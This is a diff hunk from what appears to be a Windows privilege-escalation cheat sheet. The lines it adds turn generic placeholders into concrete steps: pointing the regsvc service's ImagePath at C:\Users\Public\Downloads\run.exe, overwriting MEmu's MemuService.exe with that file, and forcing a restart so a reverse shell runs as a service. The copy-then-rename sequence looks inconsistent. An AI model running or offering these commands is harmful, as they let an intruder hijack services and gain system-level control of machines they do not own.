@@ -1237,7 +1237,7 @@ Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
 reg query HKLM:\System\CurrentControlSet\Services\regsvc
 
 # Overwrite the imagePath registry key to point to reverse shell
-reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\{PAYLOAD PATH ex. C:\PrivEsc\reverse.exe} /f
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\Public\Downloads\run.exe /f
 
 # Start the service:
 net start regsvc
@@ -1258,9 +1258,13 @@ net start regsvc
 
 # Copy the reverse shell executable to overwrite the service executable
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+Copy-Item "C:\Users\Public\Downloads\run.exe"  "C:\Program Files\Microvirt\MEmu\MemuService.exe"
+Rename-Item "C:\Program Files\Microvirt\MEmu\MemuService.exe" "C:\Program Files\Microvirt\MEmu\MemuService.bak"
+
 
 # Start the service
 net start filepermsvc
+Restart-Computer
 
 #########################################################################
 #### 5. DLL Hijacking ###################################################
